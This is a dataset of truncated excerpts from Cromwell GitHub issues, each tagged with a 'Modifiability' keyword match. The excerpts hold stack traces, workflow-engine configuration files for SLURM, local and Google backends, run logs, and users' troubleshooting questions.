=",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6327:1391,config,config,1391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6327,1,['config'],['config']
Modifiability,"nt$womtool$WomtoolMain$1(WomtoolMain.scala:166); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); at scala.Function0.apply$mcV$sp(Function0.scala:42); at scala.Function0.apply$mcV$sp$(Function0.scala:42); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:17); at scala.App.$anonfun$main$1(App.scala:98); at scala.App.$anonfun$main$1$adapted(App.scala:98); at scala.collection.IterableOnceOps.foreach(IterableOnce.scala:575); at scala.collection.IterableOnceOps.foreach$(IterableOnce.scala:573); at scala.collection.AbstractIterable.foreach(Iterable.scala:933); at scala.App.main(App.scala:98); at scala.App.main$(App.scala:96); at womtool.WomtoolMain$.main(WomtoolMain.scala:27); at womtool.WomtoolMain.main(WomtoolMain.scala); Caused by: com.typesafe.config.ConfigException$IO: application.conf: java.io.IOException: resource not found on classpath: application.conf; at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:190); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:152); at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:185); ... 48 more; Caused by: java.io.IOException: resource not found on classpath: application.conf; at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:726); at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:701); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); ... 51 more; ```. <!-- Which backend are you running? -->. The backend I'm running on is slurm and local . <!-- Paste/Attach your workflow if possible: -->. Workflow link. <!-- Def not an joke about best practices. Also thanks for publishing the gatk best practices and the warp pipelines -->. https://github.com/mmterpstra/Bestie. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Below a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:4815,config,config,4815,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['config']
Modifiability,ntPathMapper(StandardAsyncExecutionActor.scala:475); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironmentPathMapper$(StandardAsyncExecutionActor.scala:473); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironmentPathMapper(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$runtimeEnvironment$1(StandardAsyncExecutionActor.scala:479); 	 at mouse.AnyOps$.$bar$greater$extension(any.scala:8); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment$(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:637); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:607); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:382); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecu,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:5279,Config,ConfigAsyncJobExecutionActor,5279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,nts(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:382); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:749); 	 at scala.util.Try$.apply(Try.scala:213); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:749); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:749); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1139); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1131); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.bac,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:6920,config,config,6920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['config'],['config']
Modifiability,"number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; root = ""cromwell-executions""; dockerRoot = ""/cromwell-executions""; runtime-attributes = """"""; String? docker; """"""; submit = ""/usr/bin/env bash ${script}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mounted to in the container, so need to change the path with sed; submit-docker = """"""; singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} bash \; ""$(echo ${script} | sed -e 's@.*cromwell-executions@/cromwell-executions@')""; """"""; filesystems {; local {; localization: [""hard-link""]; caching {; duplication-strategy: [""hard-link""]; hasing-strategy: ""fingerprint""; check-sibling-md5: true; fingerprint-size: 1048576 # 1 MB ; }; }; }; }; }; # For running jobs by submitting them from an interactive node to the cluster; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.Confi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:4139,config,config,4139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['config'],['config']
Modifiability,"nutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; Uncaught error from thread [cromwell-system-akka.dispatchers.engine-dispatcher-4]: Uncaught error from thread [cromwell-system-akka.dispatchers.service-dispatcher-7]: unable to create new native thread, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-systemunable to create new native thread, Uncaught error from thread [cromwell-system-akka.dispatchers.io-dispatcher-15]; ]: unable to create new native thread, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]; [...]; ```. So I tried following the HPC/SLURM instructions and made a conf file:; ```; include required(classpath(""application"")). webservice {; port = 8080; }. backend {; providers {; Sherlock {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 2; Int cpus = 1; Int requested_memory_mb_per_core = 1000; String queue = ""short""; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpus} \; --mem-per-cpu ${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }. default = Sherlock; }; ```. But I get the same error on `java -Dconfig.file=/home/users/tbenst/cromwell/sherlock.conf -jar ~/cromwell/cromwell-48.jar run hello.wdl `. Any ideas what is going on? Perhaps this is some restriction for login nodes? I suppose I could submit a SLURM job to run Cromwell to then submit my actual jobs but that seems very clunky. Edit: can confirm that if I submit `java -Dconfig.file=/home/users/tbenst/cromwell/sherlock.conf -jar ~/cromwell/cromwell-48.jar run hello.wdl ` as a slurm job then it runs fine. Would be great to be able to submit jobs from u",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5395:1991,Config,ConfigBackendLifecycleActorFactory,1991,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5395,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"o every combination of things (e.g., ""got hit on the road by a; > chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken"").; > The first is harder because you represent more things (more containers),; > but the second isn't reproducible because if you lose ""by chicken"" you've; > lost the entire workflow. Does that make sense?; > What can/should we do now?; >; > So there are two things to think about. With the current representation of; > a workflow, we would want Singularity to be OCI compliant, and I would; > propose a plan to move forward is to expect this, and contribute to; > Singularity itself with the mindset of ""I want this to plug into AWS"" or ""I; > want this to plug into Kubernetes,"" etc. The backends for HPC are going to; > be good to go with just a SLURM or SGE backend, and then commands to load; > and run/exec a Singularity container. When the time comes and Singularity; > supports services, then we can start to develop (I think) the singularity; > backend configuration for cromwell, with clean commands to get statuses,; > start and stop, and otherwise integrate into the software. You guys seem; > pretty busy, so likely your best bet would be to just wait, because the; > community is going in that direction anyway.; >; > The other representation is to rethink this. An approach that I like is to; > move away from micro managing the workflow / software, and to set; > requirements for the data. If you set standard formats (meaning everything; > from the organization of files down to the headers of a data file) on the; > data itself, then the software gets built around that. A researcher can; > have confidence that the data he is collecting will work with software; > because it's validated to the format. The developers can have confidence; > their tools will work with data because of that same format. A new graduate; > student knows how to develop a new tool because there are nicely defined; > rules. A good example is to look at the BIDS (bra",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:8398,config,configuration,8398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['config'],['configuration']
Modifiability,"o use your Jira tracker, it let me log in but told me I don't have permission to see anything or do anything; 2: https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team no longer exists, and the support staff respond to questions with ""we only answer GATK isues""; 3: I am using womtool 65 and Cromwell 62. I get the same failure in both, which is that if the first line of my file is:. `version development`. As per the [WDL specifications](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#versioning) I get the error:. `ERROR: Finished parsing without consuming all tokens.`. If I do not include that line, then I get this error:. ```; Expected rbrace, got Directory.; Directory	OutputDir; ```. Does Cromwell support WDL versions pther than the default? if so, how do I specify which version to use?. Thank you,; ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438:1920,config,configuration,1920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438,1,['config'],['configuration']
Modifiability,"o] Running with database db.url = jdbc:hsqldb:mem:35603602-72c4-4c47-8662-7fdf49e59cf1;shutdown=false;hsqldb.tx=mvcc; [2018-10-23 17:48:55,95] [info] Slf4jLogger started; [2018-10-23 17:48:56,03] [info] Pre Processing Workflow...; [2018-10-23 17:48:56,20] [info] Pre-Processing /home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl; [2018-10-23 17:49:21,60] [info] Pre Processing Inputs...; [2018-10-23 17:49:21,78] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-5deb9cb"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-23 17:49:21,93] [info] Metadata summary refreshing every 2 seconds.; [2018-10-23 17:49:22,12] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,80] [info] 1 new workflows fetched; [2018-10-23 17:49:23,81] [info] WorkflowManagerActor Starting workflow d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,84] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-10-23 17:49:23,84] [warn] SingleWorkflowRunnerActor: received unexpected messa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:3085,config,configured,3085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,2,['config'],['configured']
Modifiability,"o] Running with database db.url = jdbc:hsqldb:mem:e41fe9de-508c-4f49-aeaa-ce7474d7c1e2;shutdown=false;hsqldb.tx=mvcc; [2018-09-14 13:19:20,18] [info] Slf4jLogger started; [2018-09-14 13:19:20,25] [info] Pre Processing Workflow...; [2018-09-14 13:19:20,65] [info] Pre-Processing /home/jeremiah/gdc-dnaseq-cwl/workflows/bamfastq_align/transform_pack.cwl; [2018-09-14 13:19:54,70] [info] Pre Processing Inputs...; [2018-09-14 13:19:54,94] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-89ab52b"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-09-14 13:19:55,04] [info] Metadata summary refreshing every 2 seconds.; [2018-09-14 13:19:55,31] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:19:55,32] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:19:55,32] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-09-14 13:19:56,83] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-09-14 13:19:56,88] [info] SingleWorkflowRunnerActor: Version 35-fd560e9-SNAP; [2018-09-14 13:19:56,91] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-09-14 13:19:57,89] [info] CWL (Unspecified version) workflow caab4283-a3d4-4966-85ba-56d0992c8f00 submitted; [2018-09-14 13:19:57,90] [info] SingleWorkflowRunnerActor: Workflow submitted caab4283-a3d4-4966-85ba-56d0992c8f00; [2018-09-14 13:19:57,91] [info] 1 new workflows fetched; [2018-09-14 13:19:57,92] [info] WorkflowManagerActor Starting workflow caab4283-a3d4-4966-85ba-56d0992c8f00; [2018-09-14 13:19:57,93] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-09-14 13:19:57,96] [info] WorkflowManagerActor Successfully started WorkflowActor-caab4283-a3d4-4966-85ba-56d0992c8f00; [2018-09-14 13:19:57,96] [info] R",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:1871,config,configured,1871,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['config'],['configured']
Modifiability,"obExecutionActor [755021aeHaplotypecaller.HC_GVCF:6:1]: Status change from - to Initializing; [2019-05-22 19:19:27,42] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:6:1]: Status change from Initializing to Running; ...; [2019-05-22 19:21:09,63] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:1:1]: Status change from Initializing to Running; ...; [2019-05-22 19:22:43,83] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:1:1]: Status change from Running to Succeeded; ...; [2019-05-22 19:34:19,31] [info] AwsBatchAsyncBackendJobExecutionActor [755021aeHaplotypecaller.HC_GVCF:6:1]: Status change from Running to Succeeded; ...; [2019-05-22 19:42:10,31] [error] WorkflowManagerActor Workflow 3997371c-9513-4386-a579-a72639c6e960 failed (during ExecutingWorkflowState): ; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://s4-pbg-hc/HC_Dev_Run_5/Pipeline/RSM278260-6_8plex/pipeline_workflow/3997371c-9513-4386-a579-a72639c6e960/call-Haplotypecaller/shard-0/hc.Haplotypecaller/755021ae-948b-47f9-94a8-66b486bda47d/call-HC_GVCF/shard-6/HC_GVCF-6-rc.txt: s3://s3.amazonaws.com/s4-pbg-hc/HC_Dev_Run_5/Pipeline/RSM278260-6_8plex/pipeline_workflow/3997371c-9513-4386-a579-a72639c6e960/call-Haplotypecaller/shard-0/hc.Haplotypecaller/755021ae-948b-47f9-94a8-66b486bda47d/call-HC_GVCF/shard-6/HC_GVCF-6-rc.txt; Caused by: java.io.IOException: Could not read from s3://s4-pbg-hc/HC_Dev_Run_5/Pipeline/RSM278260-6_8plex/pipeline_workflow/3997371c-9513-4386-a579-a72639c6e960/call-Haplotypecaller/shard-0/hc.Haplotypecaller/755021ae-948b-47f9-94a8-66b486bda47d/call-HC_GVCF/shard-6/HC_GVCF-6-rc.txt: s3://s3.amazonaws.com/s4-pbg-hc/HC_Dev_Run_5/Pipeline/RSM278260-6_8plex/pipeline_workflow/3997371c-9513-4386-a579-a72639c6e960/call-Haplotypecaller/shard-0/hc.Haplotypecaller/755021ae-948b-47f9-94a8-66b486bda47d/call-HC_GVCF/shard-6/HC_GVCF-6-rc.txt; C",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004:10544,Enhance,EnhancedCromwellIoException,10544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004,1,['Enhance'],['EnhancedCromwellIoException']
Modifiability,"ocumentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. When trying to configure metadata-archive in cromwell server by adding the configuration below:; ```; archive-metadata {; # A filesystem able to access the specified bucket:; filesystems {; gcs {; # A reference to the auth to use for storing and retrieving metadata:; auth = ""user-service-account""; }; }. # Which bucket to use for storing the archived metadata; bucket = ""{{ backend_bucket }}""; }; ```. when the user-service-account auth is declared up in the configuration :; ```; google {. application-name = ""cromwell"". auths = [; {; name = ""user-service-account""; scheme = ""user_service_account""; }; ]; }; ```; We got the following error in Cromwell server initialization :; cromwell_1 | [ERROR] [06/21/2023 11:55:25.094] [cromwell-system-akka.actor.default-dispatcher-30] [akka://cromwell-system/user] Failed to parse the archive-metadata config:; cromwell_1 | Failed to construct archiver path builders from factories (reason 1 of 1): Missing parameters in workflow options: user_service_account_json; cromwell_1 | akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor/MetadataService: exception during creation; cromwell_1 | 	at akka.actor.ActorInitializationException$.apply(Actor.scala:202); cromwell_1 | 	at akka.actor.ActorCell.create(ActorCell.scala:698); cromwell_1 | 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:549); cromwell_1 | 	at akka.actor.ActorCell.systemInvoke(Act",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7171:1136,config,configuration,1136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7171,1,['config'],['configuration']
Modifiability,"oesn't realize that anything under a ""is optional variable X defined?"" block can only happen if optional variable X is defined. In other words, if variant_caller.errorcode has type Array[String?], the following code block is invalid, and womtool correctly flags it as such:. ```; if(defined(variant_caller.errorcode)) { ; 	Array[String] not_optional_error_code = variant_caller.errorcode; }; ```. > Failed to process declaration 'Array[String] varcall_error_if_earlyQC_filtered = variant_call_after_earlyQC_filtering.errorcode' (reason 1 of 1): Cannot coerce expression of type 'Array[String?]' to 'Array[String]'. The normal workaround for this is to use select_first() with a bogus fallback value, since the `defined` check means that fallback value will never be selected. ```; if(defined(variant_caller.errorcode)) { ; 	Array[String] not_optional_error_code = select_first([variant_caller.errorcode, [""according to all known laws of aviation""]]); }; ```. The same holds true if I only care about the first (index 0) variable in the array. That's the case for me, since the actual workflow I'm working on will be run on Terra data tables, eg each instance of the workflow only gets one sample but dozens of instances of the workflow will be created. For compatibility reasons I cannot convert the variant caller into a non-scattered task, so its error code will still have type Array[String]? even though that array will only have one value. ```; if(defined(variant_caller.errorcode)) { ; 	String not_optional_error_code = select_first([variant_caller.errorcode[0], ""according to all known laws of aviation""]); }; ```. ## the womtool bug; I only care about variant_caller.errorcode[0] if it does not equal the word ""PASS"", so I wrote this:. ```; String pass = ""PASS""; if(defined(variant_caller.errorcode)) {; 	if(!variant_caller.errorcode[0] == pass)) {; 		String not_optional_error_code = select_first([variant_caller.errorcode[0], ""according to all known laws of aviation""]); 		}; 	}; ```. One c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7194:1543,variab,variable,1543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7194,1,['variab'],['variable']
Modifiability,"of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 25000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. #docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json"". # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:2269,config,configuration,2269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['config'],['configuration']
Modifiability,"og -Xms4000m"" \; BaseRecalibrator \; -R ${ref_fasta} \; -I ${input_bam} \; --useOriginalQualities \; -O ${recalibration_report_filename} \; -knownSites ${dbSNP_vcf} \; -knownSites ${sep="" -knownSites "" known_indels_sites_VCFs} \; -L ${sep="" -L "" sequence_group_interval}; }; runtime {; docker: ""us.gcr.io/broad-gotc-prod/genomes-in-the-cloud:2.3.2-1510681135""; memory: ""6 GB""; disks: ""local-disk "" + disk_size + "" HDD""; preemptible: preemptible_tries; }; output {; File recalibration_report = ""${recalibration_report_filename}""; }; }; ```. And here is my cromwell server config:. ```scala; include required(classpath(""application"")). webservice {; port = 8000; }. system {; workflow-restart = true; }. engine {; filesystems {. gcs {; auth = ""service-account""; }. http {}. local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; }; }; }. backend {; default = ""Local""; providers {. Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; max-concurrent-workflows = 1; concurrent-job-limit = 1; }; }. PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; project = ""bioinfo-XXXXXXX""; root = ""gs://XXXXXXXX""; genomics-api-queries-per-100-seconds = 1000; max-concurrent-workflows = 80; concurrent-job-limit = 200; maximum-polling-interval = 600. genomics {; # Config from google stanza; auth = ""service-account"". ; # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; localization-attempts = 3; }. filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; }; }; }; }; }; }. # Google authentication; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""XXXXXXXXXXXXXX@XXXXXXXXXXXX.gserv",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336:1991,Config,ConfigBackendLifecycleActorFactory,1991,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
